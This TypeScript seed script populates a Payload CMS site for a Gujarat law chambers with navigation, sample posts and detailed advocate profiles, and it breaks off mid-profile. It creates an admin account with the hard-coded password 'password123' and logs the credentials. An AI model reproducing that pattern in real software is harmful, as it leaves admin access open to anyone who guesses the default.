import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { getPayload } from 'payload'
import config from '../payload.config'
import type { Post, Page } from '@/payload-types'
import fs from 'fs'
import path from 'path'

async function seedMedia(payload: any, localFilePath: string, altText: string) {
  const absolutePath = path.resolve(localFilePath)
  if (!fs.existsSync(absolutePath)) {
    console.warn(`File not found: ${absolutePath}`)
    return null
  }

  const filename = path.basename(absolutePath)
  
  // Check if media already exists in db
  const existingMedia = await payload.find({
    collection: 'media',
    where: {
      filename: {
        equals: filename,
      },
    },
  })

  if (existingMedia.totalDocs > 0) {
    console.log(`Media "${filename}" already exists.`)
    return existingMedia.docs[0].id
  }

  console.log(`Uploading media: ${filename}...`)
  const fileBuffer = fs.readFileSync(absolutePath)
  const fileSize = fileBuffer.length
  
  let mimeType = 'image/jpeg'
  if (filename.endsWith('.png')) {
    mimeType = 'image/png'
  } else if (filename.endsWith('.webp')) {
    mimeType = 'image/webp'
  }

  const mediaDoc = await payload.create({
    collection: 'media',
    data: {
      alt: altText,
    },
    file: {
      data: fileBuffer,
      name: filename,
      mimetype: mimeType,
      size: fileSize,
    },
  })
  
  console.log(`Media "${filename}" uploaded, ID: ${mediaDoc.id}`)
  return mediaDoc.id
}

function convertStringToLexical(bioText: string) {
  if (!bioText) return null;
  
  // Clean up carriage returns and standardize newlines
  const cleanText = bioText.replace(/\r\n/g, '\n').trim();
  
  // Split by double newlines to find paragraphs/blocks
  const paragraphs = cleanText.split(/\n\s*\n/).map(p => p.trim()).filter(Boolean);
  
  const children = paragraphs.map(p => {
    // Check if it's a heading
    if (p.startsWith('### ')) {
      return {
        type: 'heading',
        tag: 'h3',
        format: '',
        indent: 0,
        version: 1,
        children: [
          {
            type: 'text',
            text: p.replace('### ', '').trim(),
            version: 1
          }
        ]
      };
    }
    
    // Check if it is a blockquote
    if (p.startsWith('>')) {
      return {
        type: 'quote',
        format: '',
        indent: 0,
        version: 1,
        children: [
          {
            type: 'text',
            text: p.replace(/^>\s*/, '').trim(),
            version: 1
          }
        ]
      };
    }
    
    // Check if it is a list of bullet points
    if (p.includes('\n• ') || p.startsWith('• ') || p.includes('\n•')) {
      const items = p.split('\n').map(line => line.trim()).filter(Boolean);
      return {
        type: 'list',
        tag: 'ul',
        listType: 'bullet',
        format: '',
        indent: 0,
        version: 1,
        children: items.map(item => {
          const itemText = item.replace(/^[•\-\*]\s*/, '').trim();
          
          // Parse inline bolding if present
          const parts = itemText.split('**');
          const itemChildren = [];
          for (let i = 0; i < parts.length; i++) {
            if (parts[i]) {
              itemChildren.push({
                type: 'text',
                text: parts[i],
                format: i % 2 === 1 ? 1 : 0, // odd indices are bold
                version: 1
              });
            }
          }
          
          return {
            type: 'listitem',
            version: 1,
            children: itemChildren.length > 0 ? itemChildren : [{
              type: 'text',
              text: itemText,
              version: 1
            }]
          };
        })
      };
    }

    // Default to paragraph
    // Parse inline bolding if present
    if (p.includes('**')) {
      const parts = p.split('**');
      const textChildren = [];
      for (let i = 0; i < parts.length; i++) {
        if (parts[i]) {
          textChildren.push({
            type: 'text',
            text: parts[i],
            format: i % 2 === 1 ? 1 : 0, // odd indices are bold
            version: 1
          });
        }
      }
      return {
        type: 'paragraph',
        format: '',
        indent: 0,
        version: 1,
        children: textChildren
      };
    }

    return {
      type: 'paragraph',
      format: '',
      indent: 0,
      version: 1,
      children: [
        {
          type: 'text',
          text: p,
          version: 1
        }
      ]
    };
  });

  return {
    root: {
      type: 'root',
      format: '',
      indent: 0,
      version: 1,
      children
    }
  };
}

async function seed() {
  console.log('--- Starting Seeding ---')
  const payload = await getPayload({ config })

  // 1. Create Admin User if not exists
  console.log('Checking for admin user...')
  const users = await payload.find({
    collection: 'users',
    where: {
      email: {
        equals: 'admin@chambers.com',
      },
    },
  })

  if (users.totalDocs === 0) {
    console.log('Creating admin user...')
    await payload.create({
      collection: 'users',
      data: {
        email: 'admin@chambers.com',
        password: 'password123',
      },
    })
    console.log('Admin user created: admin@chambers.com / password123')
  } else {
    console.log('Admin user already exists.')
  }

  // 2. Seed Header Global
  console.log('Seeding Header global...')
  await payload.updateGlobal({
    slug: 'header',
    data: {
      navItems: [
        { label: 'Home', link: '/' },
        { label: 'About CJB', link: '/about' },
        { label: 'Practice Areas', link: '/practice-areas' },
        { label: 'Blog', link: '/blog' },
        { label: 'Media', link: '/media' },
        { label: 'Offices', link: '/offices' },
        { label: 'Contact', link: '/contact' },
      ],
    },
  })
  console.log('Header seeded.')

  // 3. Seed Sample Posts
  console.log('Seeding sample posts...')
  const postItems = [
    {
      title: 'The 47 Chief Justices of India (1950-2021)',
      slug: 'cji-legacy',
      category: 'General Legal' as const,
      content: {
        root: {
          type: 'root',
          children: [
            {
              type: 'paragraph',
              children: [
                {
                  type: 'text',
                  text: 'The Constitution of India 1950 mandated as by the Supreme Court of India (SCI) when it came into force on 26th January, 1950.',
                },
              ],
            },
          ],
        },
      },
      status: 'published' as const,
      publishedAt: '2024-01-15T00:00:00.000Z',
    },
    {
      title: 'Fifty Years of The Emergency',
      slug: 'emergency-50',
      category: 'General Legal' as const,
      content: {
        root: {
          type: 'root',
          children: [
            {
              type: 'paragraph',
              children: [
                {
                  type: 'text',
                  text: 'This article examines the constitutional crisis during the 1975-77 Emergency in India.',
                },
              ],
            },
          ],
        },
      },
      status: 'published' as const,
      publishedAt: '2024-02-10T00:00:00.000Z',
    },
  ]

  for (const post of postItems) {
    const existing = await payload.find({
      collection: 'posts',
      where: { slug: { equals: post.slug } },
    })
    if (existing.totalDocs === 0) {
      await payload.create({
        collection: 'posts',
        data: post as unknown as Post,
      })
    }
  }
  console.log('Posts seeded.')

  // 4. Seed Team Members
  console.log('Seeding team members...')
  const teamMembersData = [
    {
      name: "Jeet Jayant Bhatt",
      slug: "jeet-bhatt",
      designation: "Advocate, High Court of Gujarat & Senior Partner",
      subtitle: "Leading Legal Expert in International Commercial Law & Arbitration",
      phone: "+91 9913714675",
      email: "jeetbhatt@gmail.com",
      imagePath: "public/HeroPictures/image1.jpeg",
      stats: {
        experience: "15+",
        cases: "2000+",
        publications: "10+",
        clients: "6+",
      },
      bio: convertStringToLexical(`
Jeet J. Bhatt is a seasoned Advocate with over 16 years of distinguished legal practice before the High Court of Gujarat and various forums across India. Known for his strategic litigation skills, persuasive advocacy, and deep knowledge of constitutional and commercial law, he has built a reputation as one of the most reliable and result-driven counsels in the region.

Jeet began his legal career in 2009, quickly earning recognition for his meticulous preparation, clarity of thought, and court craft. Over the years, he has successfully handled more than 2000 cases, ranging from complex constitutional challenges to high-value commercial disputes, criminal trials, arbitration proceedings, and public interest litigations (PILs).

### His expertise spans multiple domains, including:

• **Constitutional Law & Writ Jurisdiction** – Specializing in PILs, service matters, education law, and administrative actions.
• **Arbitration & Alternate Dispute Resolution** – Representing corporate and government clients in high-stakes commercial arbitration and contractual disputes.
• **Civil & Commercial Litigation** – Handling property disputes, contractual claims, and business litigation with precision.
• **White Collar Crimes & Economic Offences** – Advising and defending clients in regulatory investigations and prosecutions.
• **Consumer & Real Estate Law** – Strong practice in RERA litigation and consumer rights enforcement.

Beyond litigation, Jeet serves as a Panel Advocate for several government authorities, public sector undertakings, and corporate entities, providing both advisory and litigation services. His deep understanding of procedural law, coupled with his commitment to upholding constitutional values, has resulted in multiple landmark judgments impacting governance, education, and administrative reforms in Gujarat.

A respected voice in the legal fraternity, Jeet regularly contributes to legal journals, panel discussions, and conferences. He is the author of _“The 51 Chief Justices of India: Jurimetric & Constitutional Legacy”_, an in-depth study of the Indian judiciary’s evolution and its leadership. His thought leadership is reflected in his published articles on due process in administrative law, arbitration law reforms, and judicial accountability.

Known for his client-first approach, Jeet personally strategizes and supervises each matter entrusted to him, ensuring clear communication, transparency, and unwavering professional ethics. His ability to blend legal acumen with practical strategy has earned him the trust of a diverse clientele — from individual litigants to large corporate houses.
`),
      overview: {
        expertise: [
          { item: "International Commercial Arbitration" },
          { item: "Corporate Law" },
          { item: "Banking & Finance" },
          { item: "Real Estate Law" },
          { item: "Employment Law" },
          { item: "Criminal Defense" },
          { item: "International Commercial Law" },
          { item: "Insolvency & Bankruptcy" },
        ],
        clients: [
          { item: "Gujarat Urja Vikas Nigam Ltd (GUVNL)" },
          { item: "Export-Import Bank of India (EXIM Bank)" },
          { item: "Tata Services Ltd & Tata Group Companies" },
          { item: "Tourism Corporation of Gujarat Ltd (TCGL)" },
          { item: "Western Railways" },
          { item: "Official Liquidator, High Court of Gujarat" },
        ],
        cases: [
          { item: "Represented GUVNL in multiple High Court and NCLT proceedings" },
          { item: "Successfully handled complex arbitration matters for Western Railways" },
          { item: "Landmark liquidation proceedings before Gujarat High Court" },
          { item: "International commercial disputes for multinational corporations" },
          { item: "Complex banking and finance litigation for EXIM Bank" },
          { item: "Corporate restructuring cases for Tata Group companies" },
        ],
      },
      experience: [
        {
          title: "Senior Partner & Advocate",
          organization: "Jayant Bhatt & Associates",
          period: "June 2013 - Present",
          responsibilities: [
            { item: "Leading legal practice specializing in international commercial arbitration, corporate law, and high-stakes litigation before Gujarat High Court and Supreme Court of India" }
          ]
        },
        {
          title: "Panel Advocate",
          organization: "Gujarat Urja Vikas Nigam Ltd (GUVNL)",
          period: "2022 - Present",
          responsibilities: [
            { item: "Representing GUVNL and its subsidiary companies before the High Court and NCLT in energy sector disputes and regulatory matters" }
          ]
        },
        {
          title: "Panel Advocate",
          organization: "Export-Import Bank of India (EXIM Bank)",
          period: "April 2023 - Present",
          responsibilities: [
            { item: "Representing EXIM Bank before High Court and NCLT in banking, finance, and commercial disputes" }
          ]
        },
        {
          title: "Panel Counsel",
          organization: "Tata Services Ltd.",
          period: "June 2020 - Present",
          responsibilities: [
            { item: "Representing Tata Group of Companies in various courts and tribunals across Gujarat, providing comprehensive legal services" }
          ]
        },
        {
          title: "Panel Advocate",
          organization: "Tourism Corporation of Gujarat Ltd (TCGL)",
          period: "April 2022 - April 2024",
          responsibilities: [
            { item: "Rendering legal opinions, drafting agreements, and representing TCGL before various judicial forums in Gujarat" }
          ]
        },
        {
          title: "Standing Counsel",
          organization: "Official Liquidator, High Court of Gujarat",
          period: "January 2018 - May 2022",
          responsibilities: [
            { item: "Represented Official Liquidator in liquidation proceedings and company law matters before High Court and NCLT" }
          ]
        },
        {
          title: "Standing Counsel",
          organization: "Western Railways",
          period: "January 2018 - Present",
          responsibilities: [
            { item: "Representing Western Railway in land acquisition cases, arbitration matters before district courts and arbitration centers" }
          ]
        },
        {
          title: "Associate",
          organization: "Jani Advocates",
          period: "June 2009 - June 2013",
          responsibilities: [
            { item: "Full-service law firm practice in litigation, arbitration, and non-litigation matters, gaining expertise in commercial law, banking, and corporate law" }
          ]
        },
        {
          title: "Panel Advocate",
          organization: "High Court Legal Services Committee",
          period: "2014 - Present",
          responsibilities: [
            { item: "Providing free legal services to economically disadvantaged sections, including jail consultations and urgent court appearances" }
          ]
        },
        {
          title: "Visiting Faculty",
          organization: "Gujarat National Law University, Nirma University, United World School of Law",
          period: "Ongoing",
          responsibilities: [
            { item: "Conducting lectures on International and Domestic Arbitration, Contract Management, and Insolvency & Bankruptcy Laws" }
          ]
        }
      ],
      education: [
        {
          degree: "LLM in International Commercial and Corporate Law",
          institution: "Queen Mary University of London",
          period: "2010-2011",
          specialization: "International Commercial Arbitration, Legal Aspects of International Finance, International Banking Law"
        },
        {
          degree: "B.A, LL.B (Hons.)",
          institution: "Gujarat National Law University",
          period: "2004-2009",
          specialization: "Constitutional Law, Corporate Law"
        }
      ],
      awards: [
        {
          title: "Ministerial Recognition",
          year: "2022",
          description: "Felicitated by Hon'ble Minister of Law and Justice Shri Kiren Rijiju for remarkable achievement in Law"
        },
        {
          title: "Queen Mary Alumni Achievers Award",
          year: "2022",
          description: "Excellence in the field of Law by Queen Mary University of London, India Alumni Chapter"
        },
        {
          title: "Committee Leadership",
          year: "2013-2014",
          description: "Elected Committee Member & Convener of Education Committee, Gujarat High Court Advocates Association"
        },
        {
          title: "Academic Contribution",
          year: "Ongoing",
          description: "Visiting Faculty at Gujarat National Law University, Nirma University, United World School of Law"
        }
      ],
      publications: [
        {
          title: "Proving a Contradiction during Trial, SCC Online published on 12.09.2020",
          publisher: "Live Law",
          year: "2020",
          link: "https://www.scconline.com/blog/post/2020/09/12/proving-a-contradiction-during-a-trial/#comments"
        },
        {
          title: "The 51 Chief Justices of India (1950–2025): A Jurimetric and Constitutional Legacy",
          publisher: "Live Law",
          year: "2025",
          link: "https://www.livelaw.in/articles/51-chief-justices-india-jurimetric-constitutional-legacy-296501"
        },
        {
          title: "QUALITATIVE ANALYSIS OF CULPABLE HOMICIDE AMOUNTING TO VERSUS NOT AMOUNTING TO MURDER",
          publisher: "Indian Journal of Criminology",
          year: "2023",
          link: "https://www.researchgate.net/publication/378519245_QUALITATIVE_ANALYSIS_OF_CULPABLE_HOMICIDE_AMOUNTING_TO_VERSUS_NOT_AMOUNTING_TO_MURDER_LAW_AND_ECONOMICS_APPROACH_OF_CRIMINAL_TRIAL_COURT_Indian_Journal_of_Criminology_51_1_2023?_tp=eyJjb250ZXh0Ijp7ImZpcnN0UGFnZSI6Il9kaXJlY3QiLCJwYWdlIjoicHJvZmlsZSIsInByZXZpb3VzUGFnZSI6ImhvbWUiLCJwb3NpdGlvbiI6InBhZ2VDb250ZW50In19"
        },
        {
          title: "Economic Analysis of Culpable Homicide - Murder or Manslaughter",
          publisher: "Journal of National Law University Delhi",
          year: "2022-2023",
          link: "https://www.researchgate.net/publication/372192249_Economic_Analysis_of_Culpable_Homicide_-_Murder_or_Manslaughter_An_Empirical_Analysis_Journal_of_National_Law_University_Delhi_Volume_9_Issue_12_2022-2023_ISSN_2277-4017?_tp=eyJjb250ZXh0Ijp7ImZpcnN0UGFnZSI6Il9kaXJlY3QiLCJwYWdlIjoicHJvZmlsZSIsInByZXZpb3VzUGFnZSI6ImhvbWUiLCJwb3NpdGlvbiI6InBhZ2VDb250ZW50In19"
        },
        {
          title: "Interesting Facts about Indian Judiciary, SCC Online published on 05.01.2023,",
          publisher: "SCC Online",
          year: "2023",
          link: "https://www.scconline.com/blog/post/2023/01/05/interesting-facts-about-indian-judiciary/#search/divya.molugu%40ebcpublishing.in/_blank"
        },
        {
          title: "Tale of Two Enclaves",
          publisher: "SCC Online",
          year: "2022",
          link: "https://www.scconline.com/blog/post/2022/12/08/tale-of-two-enclaves-dadra-nagar-haveli/#search/divya.molugu%40ebcpublishing.in/_blank"
        },
        {
          title: "Cheque Bounce Cases Against Company Undergoing Moratorium under IBC, 2016",
          publisher: "Thomson Reuters",
          year: "2022",
          link: "https://www.linkedin.com/posts/jeet-bhatt-09aa9644_supremecourt-ibc-activity-6938039911203643392-99pg/?originalSubdomain=gt"
        }
      ]
    },
    {
      name: "Jayant P. Bhatt",
      slug: "jayant-p-bhatt",
      designation: "Senior Advocate, High Court of Gujarat",
      subtitle: "Pillar of Legal Excellence with Four Decades of Experience",
      phone: "+91 9825031305",
      email: "jayantpbhatt13@gmail.com",
      imagePath: "public/HeroPictures/JPBhatt.png",
      stats: {
        experience: "43+",
        cases: "2000+",
        publications: "0",
        clients: "20+",
      },
      bio: convertStringToLexical(`
Jayant P. Bhatt is a Senior Advocate of the High Court of Gujarat with an illustrious legal career spanning over four decades. Enrolled in 1982 (Enrolment No. G/608/1982), he is widely respected for his courtroom finesse, deep doctrinal knowledge, and steady stewardship of complex and high-stake litigation matters before the Hon’ble High Court of Gujarat and the Supreme Court of India.

Adv. Bhatt has served as trusted counsel and Standing Counsel for a broad range of governmental, public sector, and corporate clients, advising on and litigating matters involving municipal law, administrative governance, infrastructure contracts, and public employment.

### Appointments, Clients & Institutional Associations

• Government & Public Sector Bodies – Ahmedabad, Rajkot, and Jamnagar Municipal Corporations; Gujarat Maritime Board; Gujarat Water Supply and Sewerage Board; Gujarat Housing Board; Commissioner, Kendriya Vidyalaya Sangathan; and various electricity distribution companies including GETCO, PGVCL, MGVCL, UGVCL, and DGVCL.
• Leading Corporates & Institutions – Tata Chemicals Ltd., Reliance Industries Ltd., Digjam Ltd., Indian Rayon Ltd., Birla AT&T Communications, Torrent Power Ltd., Britannia Industries Ltd., and Stovec Electronics.
• Academic & Research Bodies – Gujarat National Law University, Gujarat Vidyapith, Plasma Research Institute.

### Arbitration & Tribunal Expertise

• Arbitration & Public Contract Disputes – Adv. Bhatt has decades of experience in arbitration and related public contract disputes. He was appointed since 1990 as Advocate before the Water Resources Department Arbitration Panel, Government of Gujarat, and was designated as Senior Advocate in 2010 by the State Legal Department for matters before the Gujarat Public Works Contracts Disputes Arbitration Tribunal. He has also been appointed as Sole Arbitrator in several high-value disputes by Gujarat Narmada Valley Fertilizers & Chemicals Ltd.

### Notable Contributions & Landmark Cases

Adv. Bhatt’s advocacy has produced numerous reported judgments in premier law journals such as GLR, GLH, and LawSuit (Guj), shaping jurisprudence in municipal law, administrative law, constitutional rights, public employment, cooperative law, and infrastructure disputes.

• Kumari Manju Singh v. Dean, B.J. Medical College, 1986 GLH 483.
• Gujarat Dalit Civil & Constitutional Rights Samiti v. Union of India, 1988 (1) GLH 204.
• Ahmedabad Municipal Corporation v. Manish Enterprise Ltd., 1992 (2) GLH 176.
• Gandhinagar Saher Jagrut Nagrik Parishad v. State of Gujarat, 2010 (1) GLR 1.
• Monikaben Ghanshyambhai Patel v. State of Gujarat, 2018 (3) GLR 1922.
• Apurva Jagdishbhai Dave v. Prapti Apurva Dave, 2020 (1) GLH 211.

### Academic Engagement & Public Service

• A committed academic, Adv. Bhatt served as Visiting Faculty at Sidharth Law College and U.M. Arts & Nathiba Commerce College, Gandhinagar, mentoring generations of law students.
• He was appointed by the State Legal Department to assist Shri B. J. Jadeja Inquiry Commission (Mangrol Commission) under the Commission of Inquiries Act, 1952.

Known for integrity, measured advocacy, and an unwavering commitment to the rule of law, Adv. Jayant P. Bhatt’s practice combines doctrinal clarity with practical strategy, making him a sought-after counsel for both public bodies and private enterprises.

>"Justice is not a matter of convenience but of commitment."
`),
      overview: {
        expertise: [
          { item: "Municipal Law" },
          { item: "Administrative Law" },
          { item: "Constitutional Rights" },
          { item: "Public Employment Law" },
          { item: "Cooperative Law" },
          { item: "Infrastructure Disputes" },
          { item: "International Commercial Arbitration" },
          { item: "Public Contracts Arbitration" },
        ],
        clients: [
          { item: "Ahmedabad Municipal Corporation" },
          { item: "Rajkot Municipal Corporation" },
          { item: "Jamnagar Municipal Corporation" },
          { item: "Gujarat Maritime Board" },
          { item: "Gujarat Water Supply and Sewerage Board" },
          { item: "Gujarat Housing Board" },
          { item: "Kendriya Vidyalaya Sangathan" },
          { item: "GETCO" },
          { item: "PGVCL" },
          { item: "MGVCL" },
          { item: "UGVCL" },
          { item: "DGVCL" },
          { item: "Tata Chemicals Ltd." },
          { item: "Reliance Industries Ltd." },
          { item: "Digjam Ltd." },
          { item: "Indian Rayon Ltd." },
          { item: "Birla AT&T Communications" },
          { item: "Torrent Power Ltd." },
          { item: "Britannia Industries Ltd." },
          { item: "Stovec Electronics" },
          { item: "Gujarat National Law University" },
          { item: "Gujarat Vidyapith" },
          { item: "Plasma Research Institute" },
        ],
        cases: [
          { item: "Kumari Manju Singh v. Dean, B.J. Medical College, 1986 GLH 483" },
          { item: "Gujarat Dalit Civil & Constitutional Rights Samiti v. Union of India, 1988 (1) GLH 204" },
          { item: "Ahmedabad Municipal Corporation v. Manish Enterprise Ltd., 1992 (2) GLH 176" },
          { item: "Gandhinagar Saher Jagrut Nagrik Parishad v. State of Gujarat, 2010 (1) GLR 1" },
          { item: "Monikaben Ghanshyambhai Patel v. State of Gujarat, 2018 (3) GLR 1922" },
          { item: "Apurva Jagdishbhai Dave v. Prapti Apurva Dave, 2020 (1) GLH 211" },
        ],
      },
      experience: [
        {
          title: "Senior Advocate",
          organization: "High Court of Gujarat",
          period: "1982 - Present",
          responsibilities: [
            { item: "Over four decades of distinguished legal practice specializing in municipal law, administrative law, constitutional rights, and public employment matters" }
          ]
        },
        {
          title: "Advocate",
          organization: "Water Resources Department Arbitration Panel, Government of Gujarat",
          period: "1990 - Present",
          responsibilities: [
            { item: "Appointed as advocate for arbitration matters in water resources and public works contracts disputes" }
          ]
        },
        {
          title: "Senior Advocate",
          organization: "Gujarat Public Works Contracts Disputes Arbitration Tribunal",
          period: "2010 - Present",
          responsibilities: [
            { item: "Designated by State Legal Department for complex public works contract disputes and arbitration proceedings" }
          ]
        },
        {
          title: "Sole Arbitrator",
          organization: "Gujarat Narmada Valley Fertilizers & Chemicals Ltd",
          period: "Various Appointments",
          responsibilities: [
            { item: "Appointed as sole arbitrator in multiple high-value commercial disputes and contractual matters" }
          ]
        },
        {
          title: "Standing Counsel",
          organization: "Multiple Government & Corporate Entities",
          period: "1985 - Present",
          responsibilities: [
            { item: "Serving as trusted counsel for municipal corporations, public sector entities, and major corporate clients across diverse industries" }
          ]
        },
        {
          title: "Visiting Faculty",
          organization: "Sidharth Law College & U.M. Arts & Nathiba Commerce College",
          period: "2005 - 2020",
          responsibilities: [
            { item: "Academic engagement teaching municipal law, administrative law, and constitutional principles to law students" }
          ]
        },
        {
          title: "Commission Counsel",
          organization: "Mangrol Commission (B. J. Jadeja Inquiry Commission)",
          period: "1982 - 1983",
          responsibilities: [
            { item: "Appointed by State Legal Department to assist the inquiry commission under the Commission of Inquiries Act, 1952" }
          ]
        }
      ],
      education: [
        {
          degree: "B.Sc., LL.B",
          institution: "Enrolled 1982",
          period: "1982",
          specialization: ""
        }
      ],
      awards: [
        {
          title: "Standing Counsel Appointments",
          year: "1990 – Present",
          description: "Advocate before the Water Resources Department Arbitration Panel since 1990 and Senior Advocate in Gujarat Public Works Contracts Disputes Tribunal since 2010"
        },
        {
          title: "Sole Arbitrator Appointments",
          year: "Various",
          description: "Appointed sole arbitrator in multiple high-value disputes by Gujarat Narmada Valley Fertilizers & Chemicals Ltd."
        },
        {
          title: "Visiting Faculty",
          year: "2005 – 2020",
          description: "Taught at Sidharth Law College and U.M. Arts & Nathiba Commerce College, Gandhinagar for over 15 years"
        },
        {
          title: "Inquiry Commission Member",
          year: "1982 – 1983",
          description: "Assisted the Mangrol Commission under the Commission of Inquiries Act, 1952"
        }
      ]
    },
    {
      name: "Chetan P. Pandya",
      slug: "chetan-p-pandya",
      designation: "Advocate, Gujarat High Court",
      subtitle: "Experienced Counsel in DRT/DRAT/NCLT and Banking & Commercial Matters",
      phone: "+91 98256 99309",
      imagePath: "public/HeroPictures/CP.jpg",
      stats: {
        experience: "26+",
        cases: "3000+",
        publications: "5",
        clients: "20+",
      },
      bio: convertStringToLexical(`
Chetan P. Pandya is a distinguished advocate with a standing of more than 26 years at the Bar, having extensive experience appearing before the Gujarat High Court and various commercial law forums.

Mr. Pandya has been part of several leading chambers of Gujarat, including the chambers of Yogesh Lakhani (Senior Advocate, Gujarat High Court) and Jani Advocates led by Adv. Bharat Jani and the late Adv. Utkarsh Jani.

He specialises in matters and laws pertaining to DRT, DRAT and NCLT. His practice includes significant work on Corporate, Commercial and SARFAESI-allied laws.

Mr. Pandya’s distinguished clientele includes several banks, NBFCs and financial institutions, and his empanelment has included leading banks such as Dena Bank (now merged into Bank of Baroda) and IDBI Bank.

His focused and specialised experience in banking, recovery and insolvency-related forums makes him a recognised practitioner in these subject areas.
`),
      overview: {
        expertise: [
          { item: "DRT (Debt Recovery Tribunal)" },
          { item: "DRAT (Debt Recovery Appellate Tribunal)" },
          { item: "NCLT (National Company Law Tribunal)" },
          { item: "Corporate Law" },
          { item: "Commercial Law" },
          { item: "SARFAESI & allied laws" },
          { item: "Banking & Financial Institutions representation" },
        ],
        clients: [
          { item: "Dena Bank (now merged into Bank of Baroda)" },
          { item: "IDBI Bank" },
          { item: "Various Banks & NBFCs" },
        ],
        cases: [],
      },
      experience: [],
      education: [],
      awards: []
    },
    {
      name: "Tarun S. Rajput",
      slug: "tarun-rajput",
      designation: "Advocate - Gujarat High Court & Subordinate Judiciary",
      subtitle: "Pursuing LL.M. (Criminology) | Specialist in Civil & Criminal Litigation",
      phone: "+91 75679 79513",
      imagePath: "public/HeroPictures/Tarun_S_Rajput.jpeg",
      stats: {
        experience: "2+",
        cases: "50+",
        publications: "1",
        clients: "4",
      },
      bio: convertStringToLexical(`
Tarun S. Rajput is a dedicated advocate practicing before the Hon'ble Gujarat High Court and various subordinate courts across Gujarat. Currently pursuing LL.M. in Criminology, he brings fresh perspectives to contemporary criminal jurisprudence. His practice philosophy is rooted in the belief that 'an advocate is a bridge between the law and justice—a custodian of both rights and responsibilities.' Guided by the legal maxim 'Fiat Justitia Ruat Caelum'—Let justice be done though the heavens fall.
`),
      overview: {
        expertise: [
          { item: "Civil and Criminal Litigation" },
          { item: "Matrimonial Disputes & Family Law" },
          { item: "Land and Property Disputes" },
          { item: "Municipal and Revenue Proceedings" },
          { item: "Constitutional Writs" },
          { item: "Criminal Jurisprudence" },
          { item: "Penology and Procedural Law" },
        ],
        clients: [
          { item: "Individual Criminal Defense Clients" },
          { item: "Family Law Clients" },
          { item: "Property Dispute Clients" },
          { item: "Municipal Proceeding Clients" },
        ],
        cases: [
          { item: "Successfully handled complex matrimonial disputes" },
          { item: "Represented clients in constitutional writ petitions" },
          { item: "Managed intricate land and property disputes" },
          { item: "Effective advocacy in criminal litigation matters" },
          { item: "Strategic representation in municipal proceedings" },
        ],
      },
      experience: [
        {
          title: "Legal Intern",
          organization: "Rajan J. Patel, Advocate",
          period: "May 2023 - January 2024",
          responsibilities: [
            { item: "Comprehensive legal training in civil and criminal matters" }
          ]
        },
        {
          title: "Intern",
          organization: "Bhatt & Joshi Associates",
          period: "May 2022 - September 2022",
          responsibilities: [
            { item: "Foundation training in legal practice and client representation" }
          ]
        }
      ],
      education: [
        {
          degree: "LL.M. (Criminology)",
          institution: "Pursuing - Focus on Criminal Jurisprudence & Penology",
          period: "2024-Present",
          specialization: "Contemporary Criminal Jurisprudence, Penology, and Procedural Law"
        },
        {
          degree: "Integrated B.A. LL.B.",
          institution: "GLS University",
          period: "2020-2025",
          specialization: "Law with focus on Civil and Criminal Practice"
        }
      ],
      awards: [
        {
          title: "Academic Excellence",
          year: "2024-Present",
          description: "Pursuing advanced studies in Criminology while maintaining active legal practice"
        },
        {
          title: "Comprehensive Legal Training",
          year: "2022-2024",
          description: "Extensive internship experience across multiple legal domains"
        }
      ],
      publications: [
        {
          title: "Contemporary Issues in Criminal Jurisprudence",
          publisher: "Legal Research Publication",
          year: "2024"
        }
      ]
    },
    {
      name: "Aman Kadri",
      slug: "aman-kadri",
      designation: "Advocate, Gujarat High Court | LLM Graduate Penn State Law",
      subtitle: "International Commercial Law Expert | Moot Court Champion",
      phone: "+91 81607 75183",
      imagePath: "public/HeroPictures/AmanKadri.png",
      stats: {
        experience: "1+",
        cases: "25+",
        publications: "3",
        clients: "4",
      },
      bio: convertStringToLexical(`
Advocate Aman Kadri combines rigorous academic training with focused courtroom experience at Chambers of Jeet Jayant Bhatt. A graduate of the Institute of Law, Nirma University (B.Com., LL.B. Hons.) and an LL.M. alumnus of Penn State Law where he specialised in International Commercial & Investment Arbitration, Comparative Constitutional Law, and Comparative Commercial Law. Aman brings a broad comparative perspective and meticulous attention to every brief.

His practice before the Gujarat High Court centres on civil, commercial, arbitration, and service law matters. Clients appreciate his clear analysis, precise drafting, and steady advocacy, whether the issue concerns complex shareholder disputes or enforcement of arbitral awards. Aman’s excellence in advocacy was recognised early through victories at the NALSAR CCI Antitrust Moot and the Justice B.R. Sawhney Memorial Moot; he now shares that experience by conducting workshops on written submissions and oral argument and by mentoring young advocates within the chambers.

Aman has assisted senior counsel in highstakes commercial litigation and contributed research to publications on antitrust and investment arbitration. Away from the courtroom, he pursues cricket and literature pastimes that sharpen his discipline and reinforce his clarity of thought. His presence strengthens our commitment to delivering precise, forwardlooking legal solutions.
`),
      overview: {
        expertise: [
          { item: "International Commercial & Investment Arbitration" },
          { item: "Comparative Commercial Laws" },
          { item: "International Law" },
          { item: "Constitutional Law" },
          { item: "Competition Law" },
          { item: "Legal Writing & Research" },
        ],
        clients: [
          { item: "International Commercial Entities" },
          { item: "Arbitration Clients" },
          { item: "Constitutional Law Clients" },
          { item: "Competition Law Matters" },
        ],
        cases: [
          { item: "International commercial arbitration matters" },
          { item: "Complex constitutional law petitions" },
          { item: "Competition law compliance issues" },
          { item: "Cross-border commercial disputes" },
          { item: "Investment arbitration proceedings" },
        ],
      },
      experience: [
        {
          title: "Advocate",
          organization: "High Court of Gujarat",
          period: "February 2025 - Present",
          responsibilities: [
            { item: "Active legal practice in commercial and constitutional matters" }
          ]
        },
        {
          title: "Legal Intern",
          organization: "Chambers of Senior Advocate Percy M. Kavina (Gujarat High Court)",
          period: "June 2024 - July 2024",
          responsibilities: [
            { item: "Advanced training in high court practice and procedure" }
          ]
        },
        {
          title: "Chairperson",
          organization: "Moot Court Committee (Organizing) ILNU",
          period: "August 2022 - September 2023",
          responsibilities: [
            { item: "Leadership role in organizing national moot court competitions" }
          ]
        },
        {
          title: "Intern",
          organization: "Trilegal",
          period: "August 2023",
          responsibilities: [
            { item: "Corporate law practice at premier law firm" }
          ]
        },
        {
          title: "Legal Intern",
          organization: "Chambers of Senior Advocate Prashanto Chandra Sen (Supreme Court of India)",
          period: "June 2023 - July 2023",
          responsibilities: [
            { item: "Supreme Court practice experience in constitutional matters" }
          ]
        },
        {
          title: "Legal Intern",
          organization: "Khaitan & Co",
          period: "January 2023",
          responsibilities: [
            { item: "Corporate and commercial law practice" }
          ]
        },
        {
          title: "Judicial Law Clerk",
          organization: "High Court of Gujarat (Chambers of Justice Vipul M. Pancholi)",
          period: "January 2022 - February 2022",
          responsibilities: [
            { item: "Direct judicial experience and court procedure training" }
          ]
        }
      ],
      education: [
        {
